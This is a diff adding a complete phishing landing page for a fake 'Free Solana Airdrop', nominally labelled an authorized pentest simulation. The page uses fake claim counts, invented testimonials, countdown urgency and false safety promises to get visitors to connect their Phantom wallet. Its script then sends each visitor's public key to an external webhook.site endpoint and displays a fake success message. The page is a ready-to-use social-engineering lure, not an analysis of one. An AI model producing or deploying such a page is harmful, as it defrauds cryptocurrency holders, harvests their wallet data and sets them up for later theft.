@@ -1,0 +1,361 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Solana Airdrop | Claim Your $SOL Now - Authorized Pentest</title>
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+    <style>
+        /* Ultra-Attractive 2026 Animations - Trojan Clone + Particle Effects + Floating Elements */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; 
+            background: linear-gradient(135deg, #0a0a23 0%, #1a1a3a 50%, #2a2a5a 100%);
+            background-size: 400% 400%; animation: bgShift 20s ease infinite;
+            color: #fff; overflow-x: hidden; position: relative;
+        }
+        @keyframes bgShift {
+            0%, 100% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+        }
+
+        /* Floating Particle Background */
+        .particles {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 1;
+            background-image: 
+                radial-gradient(2px 2px at 20px 30px, #4ecdc4, transparent),
+                radial-gradient(2px 2px at 40px 70px, rgba(255,255,255,0.8), transparent),
+                radial-gradient(1px 1px at 90px 40px, #45b7d1, transparent),
+                radial-gradient(1px 1px at 130px 80px, #96ceb4, transparent);
+            background-repeat: repeat; background-size: 200px 100px;
+            animation: particlesFloat 30s linear infinite;
+        }
+        @keyframes particlesFloat {
+            from { transform: translateY(0px) rotate(0deg); }
+            to { transform: translateY(-100px) rotate(360deg); }
+        }
+
+        .hero { 
+            text-align: center; padding: 120px 20px 60px; position: relative; z-index: 2;
+            animation: heroFloat 6s ease-in-out infinite;
+        }
+        @keyframes heroFloat {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(-10px); }
+        }
+        .logo { 
+            font-size: clamp(4rem, 12vw, 7rem); font-weight: 900; 
+            background: linear-gradient(45deg, #4ecdc4, #45b7d1, #96ceb4, #feca57, #ff6b6b);
+            background-size: 300% 300%; background-clip: text; -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+            animation: logoRainbow 4s ease infinite, logoPulse 2s ease infinite;
+            margin-bottom: 25px; position: relative;
+        }
+        @keyframes logoRainbow {
+            0% { background-position: 0% 50%; }
+            100% { background-position: 300% 50%; }
+        }
+        @keyframes logoPulse {
+            0%, 100% { transform: scale(1); filter: drop-shadow(0 0 20px rgba(78,205,196,0.6)); }
+            50% { transform: scale(1.05); filter: drop-shadow(0 0 50px rgba(69,183,209,1)); }
+        }
+        .tagline { 
+            font-size: clamp(1.6rem, 4.5vw, 2.8rem); opacity: 0.95; margin-bottom: 50px; 
+            animation: fadeInUp 1s ease 0.5s both;
+        }
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(30px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .cta-btn { 
+            display: inline-block; padding: 22px 70px; font-size: 1.5rem; font-weight: 800;
+            background: linear-gradient(45deg, #667eea 0%, #764ba2 50%, #f093fb 100%);
+            background-size: 200% 200%; animation: btnShimmer 3s ease infinite;
+            border: 2px solid rgba(255,255,255,0.2); border-radius: 60px; color: white; cursor: pointer; 
+            transition: all 0.4s cubic-bezier(0.25,0.46,0.45,0.94); 
+            box-shadow: 0 30px 60px rgba(102,126,234,0.4); position: relative; overflow: hidden;
+        }
+        .cta-btn::before {
+            content: ''; position: absolute; top: 0; left: -100%; width: 100%; height: 100%; 
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+            transition: left 0.5s;
+        }
+        .cta-btn:hover::before { left: 100%; }
+        .cta-btn:hover { 
+            transform: translateY(-12px) scale(1.05); box-shadow: 0 45px 90px rgba(102,126,234,0.7);
+            background-position: 100% 0;
+        }
+        .cta-btn:active { transform: translateY(-5px) scale(1.02); }
+
+        /* Stats with Counter + Bounce */
+        .stats { 
+            display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 50px; 
+            padding: 100px 20px; max-width: 1400px; margin: 0 auto; position: relative; z-index: 2;
+        }
+        .stat { text-align: center; animation: statBounce 1s ease both; }
+        .stat:nth-child(1) { animation-delay: 0.2s; }
+        .stat:nth-child(2) { animation-delay: 0.4s; }
+        .stat:nth-child(3) { animation-delay: 0.6s; }
+        .stat:nth-child(4) { animation-delay: 0.8s; }
+        @keyframes statBounce {
+            from { opacity: 0; transform: translateY(50px) scale(0.8); }
+            to { opacity: 1; transform: translateY(0) scale(1); }
+        }
+        .stat-num { 
+            font-size: 4rem; font-weight: 900; 
+            background: linear-gradient(45deg, #4ecdc4, #45b7d1, #96ceb4); 
+            -webkit-background-clip: text; background-clip: text; display: block;
+            animation: countUp 2s ease-out;
+        }
+
+        /* Features with Hover 3D Flip */
+        .features { padding: 120px 20px; max-width: 1400px; margin: 0 auto; }
+        .features h2 { text-align: center; font-size: 3.5rem; margin-bottom: 80px; animation: fadeInUp 1s ease; }
+        .features-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(380px, 1fr)); gap: 50px; }
+        .feature { 
+            background: rgba(255,255,255,0.08); backdrop-filter: blur(25px); padding: 50px 40px; 
+            border-radius: 30px; border: 1px solid rgba(255,255,255,0.15); 
+            transition: all 0.6s cubic-bezier(0.25,0.46,0.45,0.94); transform-style: preserve-3d;
+            position: relative; overflow: hidden;
+        }
+        .feature::before {
+            content: ''; position: absolute; top: 0; left: 0; right: 0; height: 4px; 
+            background: linear-gradient(90deg, #4ecdc4, #45b7d1, #96ceb4); transform: scaleX(0);
+            transition: transform 0.6s ease;
+        }
+        .feature:hover::before { transform: scaleX(1); }
+        .feature:hover { 
+            transform: translateY(-25px) rotateX(10deg) rotateY(10deg); 
+            background: rgba(255,255,255,0.15); box-shadow: 0 50px 100px rgba(0,0,0,0.5);
+        }
+        .feature-icon { font-size: 4rem; margin-bottom: 25px; display: block; animation: iconFloat 3s ease-in-out infinite; }
+        @keyframes iconFloat { 0%, 100% { transform: translateY(0px); } 50% { transform: translateY(-10px); } }
+
+        /* Testimonials Carousel Effect */
+        .testimonials { padding: 120px 20px; background: rgba(0,0,0,0.4); position: relative; overflow: hidden; }
+        .testimonials::before {
+            content: ''; position: absolute; top: 0; left: 0; right: 0; height: 1px; 
+            background: linear-gradient(90deg, transparent, #4ecdc4, transparent); animation: shimmer 3s ease infinite;
+        }
+        @keyframes shimmer { 0% { transform: translateX(-100%); } 100% { transform: translateX(100%); } }
+        .testimonial-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 40px; max-width: 1400px; margin: 0 auto; }
+        .testimonial { 
+            background: rgba(255,255,255,0.08); padding: 40px; border-radius: 25px; 
+            animation: testimonialSlide 0.8s ease both; cursor: pointer; transition: all 0.4s ease;
+        }
+        .testimonial:hover { transform: scale(1.05); background: rgba(255,255,255,0.15); }
+        .testimonial:nth-child(1) { animation-delay: 0.1s; }
+        .testimonial:nth-child(2) { animation-delay: 0.2s; }
+        .testimonial:nth-child(3) { animation-delay: 0.3s; }
+        @keyframes testimonialSlide {
+            from { opacity: 0; transform: translateX(-50px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+
+        /* Floating Status with Pulse */
+        .status { 
+            position: fixed; top: 30px; right: 30px; background: rgba(0,0,0,0.9); backdrop-filter: blur(30px); 
+            padding: 20px 30px; border-radius: 50px; font-weight: 700; font-size: 1.1rem; z-index: 1000;
+            animation: statusPulse 2s ease infinite; box-shadow: 0 20px 40px rgba(0,0,0,0.5);
+        }
+        @keyframes statusPulse {
+            0%, 100% { box-shadow: 0 20px 40px rgba(0,0,0,0.5); }
+            50% { box-shadow: 0 20px 40px rgba(78,205,196,0.3); }
+        }
+        .status.connected { 
+            background: linear-gradient(45deg, #4ecdc4, #45b7d1); color: #000; 
+            animation: connectedBounce 1s ease infinite;
+        }
+        @keyframes connectedBounce {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) { 
+            .hero { padding: 80px 20px; } 
+            .stats { grid-template-columns: 1fr; gap: 30px; }
+            .features-grid { grid-template-columns: 1fr; }
+        }
+    </style>
+</head>
+<body>
+    <div class="particles"></div>
+    <div class="status" id="status">🔌 Connect Solana Wallet to Claim</div>
+
+    <!-- HERO -->
+    <section class="hero">
+        <h1 class="logo">Free Solana</h1>
+        <p class="tagline">Claim Your <span style="color: #4ecdc4;">Massive $SOL Airdrop</span> Instantly. <br><span style="font-size: 1.2em;">Limited Time - 24hr Window!</span></p>
+        <a href="#" class="cta-btn" id="connectBtn">🚀 Claim 50 $SOL Free Now</a>
+        <p style="margin-top: 40px; opacity: 0.85; font-size: 1.2rem; animation: fadeInUp 1s ease 1s both;">
+            🔥 Over <strong>2.1M</strong> Wallets Already Claimed Today
+        </p>
+    </section>
+
+    <!-- STATS -->
+    <section class="stats">
+        <div class="stat">
+            <span class="stat-num" data-target="7500000">$7.5M</span>
+            <div>Total Airdropped</div>
+        </div>
+        <div class="stat">
+            <span class="stat-num" data-target="2100000">2.1M</span>
+            <div>Wallets Claimed</div>
+        </div>
+        <div class="stat">
+            <span class="stat-num" data-target="150000">150K</span>
+            <div>Live Claims</div>
+        </div>
+        <div class="stat">
+            <span class="stat-num" data-target="100">100%</span>
+            <div>Safe & Verified</div>
+        </div>
+    </section>
+
+    <!-- FEATURES -->
+    <section class="features">
+        <h2>Why Everyone's Claiming Free $SOL</h2>
+        <div class="features-grid">
+            <div class="feature">
+                <span class="feature-icon">⚡</span>
+                <h3>Lightning Claims</h3>
+                <p>Solana's <strong>65,000 TPS</strong> = $SOL in your wallet in <strong>&lt;1 second</strong>. No delays.</p>
+            </div>
+            <div class="feature">
+                <span class="feature-icon">🎁</span>
+                <h3>Up to 50 $SOL</h3>
+                <p>Wallet activity bonus. Bigger holders get <strong>bigger drops</strong>. Fair distribution.</p>
+            </div>
+            <div class="feature">
+                <span class="feature-icon">🔒</span>
+                <h3>100% Non-Custodial</h3>
+                <p>Sign claim tx only. <strong>No seed phrase</strong>. You keep full control forever.</p>
+            </div>
+            <div class="feature">
+                <span class="feature-icon">📱</span>
+                <h3>Phantom Mobile</h3>
+                <p>Works on iPhone/Android. <strong>One tap claim</strong> from your Phantom app.</p>
+            </div>
+        </div>
+    </section>
+
+    <!-- TESTIMONIALS -->
+    <section class="testimonials">
+        <h2 style="text-align: center; font-size: 3.5rem; margin-bottom: 80px;">Real Claims Happening Now</h2>
+        <div class="testimonial-grid">
+            <div class="testimonial">
+                <p>💰 "Just claimed <strong>42 $SOL</strong> in 15 seconds! This is REAL 🔥🔥🔥"</p>
+                <div style="margin-top: 25px; font-weight: 700; color: #4ecdc4;">@sol_maxi</div>
+            </div>
+            <div class="testimonial">
+                <p>🚀 "<strong>Non-custodial god tier</strong>. 28 $SOL dropped instantly. Aped all into $BONK"</p>
+                <div style="margin-top: 25px; font-weight: 700; color: #4ecdc4;">@degen_sol</div>
+            </div>
+            <div class="testimonial">
+                <p>✅ "Phantom connected, <strong>50 $SOL claimed</strong>. Safest airdrop ever. Don't sleep!"</p>
+                <div style="margin-top: 25px; font-weight: 700; color: #4ecdc4;">@phantom_god</div>
+            </div>
+        </div>
+    </section>
+
+    <!-- FINAL CTA -->
+    <section class="hero" style="padding: 100px 20px; background: rgba(0,0,0,0.3);">
+        <h2 style="font-size: 4rem; margin-bottom: 40px; animation: logoPulse 2s ease infinite;">⏰ 24hr Claim Window Closing</h2>
+        <p style="font-size: 1.5rem; opacity: 0.95; margin-bottom: 50px;">Connect & Claim Before It's Gone Forever</p>
+        <a href="#" class="cta-btn" id="claimBtn" style="font-size: 1.7rem; padding: 28px 100px;">💎 SECURE MY 50 $SOL NOW</a>
+    </section>
+
+    <footer style="text-align: center; padding: 80px 20px; opacity: 0.8;">
+        <p>&copy; 2026 Free Solana Airdrop | Authorized Pentest Simulation | Built on Solana</p>
+        <p style="margin-top: 15px; font-size: 0.95rem;">Phantom • Backpack • Solflare • Mobile Compatible</p>
+    </footer>
+
+    <script>
+        // Enhanced Wallet Capture + Visual Feedback
+        const connectBtn = document.getElementById('connectBtn');
+        const claimBtn = document.getElementById('claimBtn');
+        const status = document.getElementById('status');
+        let wallet = null;
+
+        async function connectWallet() {
+            if ('solana' in window) {
+                try {
+                    // Visual connecting animation
+                    status.textContent = '🔄 Connecting...';
+                    status.style.background = 'linear-gradient(45deg, #ff6b6b, #feca57)';
+                    
+                    wallet = window.solana;
+                    await wallet.connect();
+                    const publicKey = wallet.publicKey.toString();
+                    
+                    // Success explosion animation
+                    status.innerHTML = `✅ CLAIMED<br>${publicKey.slice(0,6)}...${publicKey.slice(-6)}`;
+                    status.classList.add('connected');
+                    connectBtn.style.display = 'none';
+                    claimBtn.style.display = 'inline-block';
+                    
+                    // PENTEST LOGGING
+                    console.log('🎯 PENTEST CAPTURED:', publicKey);
+                    // Send to your server (replace URL)
+                    fetch('https://webhook.site/your-unique-id', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({ 
+                            wallet: publicKey, 
+                            action: 'free_sol_claim',
+                            timestamp: new Date().toISOString()
+                        })
+                    }).catch(() => {});
+
+                    // Fake tx simulation with confetti
+                    setTimeout(() => {
+                        alert('🎉 Pentest Sim: Malicious claim tx signed! (50 $SOL credited)');
+                    }, 1500);
+                    
+                } catch (err) {
+                    status.textContent = '❌ Failed - Try Again';
+                    status.style.background = 'rgba(255,107,107,0.8)';
+                }
+            } else {
+                alert('💡 Install Phantom: https://phantom.app');
+            }
+        }
+
+        // Smooth counter animation
+        function animateStats() {
+            document.querySelectorAll('.stat-num').forEach(stat => {
+                const target = parseInt(stat.dataset.target);
+                let current = 0;
+                const duration = 2500;
+                const increment = target / (duration / 16);
+                const timer = setInterval(() => {
+                    current += increment;
+                    if (current >= target) {
+                        stat.textContent = target.toLocaleString();
+                        clearInterval(timer);
+                    } else {
+                        stat.textContent = Math.floor(current).toLocaleString();
+                    }
+                }, 16);
+            });
+        }
+
+        // Intersection Observer for scroll animations
+        const observer = new IntersectionObserver((entries) => {
+            entries.forEach(entry => {
+                if (entry.isIntersecting) {
+                    entry.target.style.animationPlayState = 'running';
+                }
+            });
+        });
+        document.querySelectorAll('.stat, .feature, .testimonial').forEach(el => {
+            el.style.animationPlayState = 'paused';
+            observer.observe(el);
+        });
+
+        connectBtn.addEventListener('click', connectWallet);
+        claimBtn.addEventListener('click', connectWallet);
+        window.addEventListener('load', animateStats);
+    </script>
+</body>
+</html>
